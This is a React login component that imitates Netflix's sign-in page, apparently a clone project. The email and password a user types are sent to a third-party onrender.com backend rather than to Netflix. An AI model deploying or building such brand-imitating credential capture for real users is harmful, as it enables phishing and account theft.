import axios from "axios";
import { useState } from "react";
import { useNavigate } from "react-router-dom";

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [err, setErr] = useState("");
  const Navigate = useNavigate();

  function check() {
    if (email.trim() === "" || password.trim() === "") {
      setErr("Email and Password are required!");
      return;
    }

    setErr("");

    axios
      .post("https://netflixbackend-82oq.onrender.com/login", {
        username: email,
        password: password,
      })
      .then((res) => {
        if (res.data === true) {
          Navigate("/success");
        } else {
          Navigate("/fail");
        }
      })
      .catch((err) => console.error("Error:", err));
  }

  return (
    <div className="min-h-screen bg-black lg:bg-[url('/bg.jpg')] bg-cover bg-center relative">
      {/* Netflix Logo */}
      <div className="absolute top-5 left-5 z-10">
        <img src="/ttle.png" alt="Netflix Logo" className="w-32" />
      </div>

      {/* Login Box */}
      <div className="flex justify-center items-center min-h-screen">
        <div className="bg-black bg-opacity-80 p-6 rounded-md w-full max-w-md text-white mx-4">
          <h2 className="text-3xl font-bold mb-4 text-center">Sign In</h2>

          <input
            type="email"
            placeholder="Email"
            onChange={(e) => setEmail(e.target.value)}
            className="w-full p-3 rounded-md bg-transparent border border-white focus:outline-none mb-4"
          />
          <input
            type="password"
            placeholder="Password"
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-3 rounded-md bg-transparent border border-white focus:outline-none mb-4"
          />

          {err && <p className="text-red-500 text-sm mb-2">{err}</p>}

          <button
            onClick={check}
            className="bg-red-700 hover:bg-red-600 w-full p-3 rounded-md mb-4 font-semibold"
          >
            Sign In
          </button>

          <p className="text-center text-xl font-bold">Or</p>

          <button className="bg-gray-600 w-full mt-3 p-3 rounded-md hover:bg-gray-500">
            Use Sign-in Code
          </button>

          <p className="text-center underline mt-3">Forgot Password?</p>

          <div className="flex items-center mt-4">
            <input type="checkbox" className="mr-2" />
            <label>Remember Me</label>
          </div>

          <p className="mt-3">
            New to Netflix?
            <span className="underline ml-1">Sign up now</span>
          </p>

          <p className="text-xs mt-2">
            This page is protected by Google reCAPTCHA to ensure you're not a
            bot.{" "}
            <span className="text-blue-400 underline cursor-pointer">
              Learn more.
            </span>
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-black bg-opacity-80 flex flex-col lg:flex-row justify-around items-center gap-4 py-6 px-4 text-white text-sm">
        <div className="flex flex-col gap-1 items-center lg:items-start">
          <p className="underline cursor-pointer">FAQ</p>
          <p className="underline cursor-pointer">Terms Of Use</p>
          <p className="underline cursor-pointer">Cookies Preference</p>
        </div>
        <div className="flex flex-col gap-1 items-center lg:items-start">
          <p className="underline cursor-pointer">Help Center</p>
          <p className="underline cursor-pointer">Privacy</p>
          <p className="underline cursor-pointer">Corporate Information</p>
        </div>
      </footer>
    </div>
  );
};

export default Login;
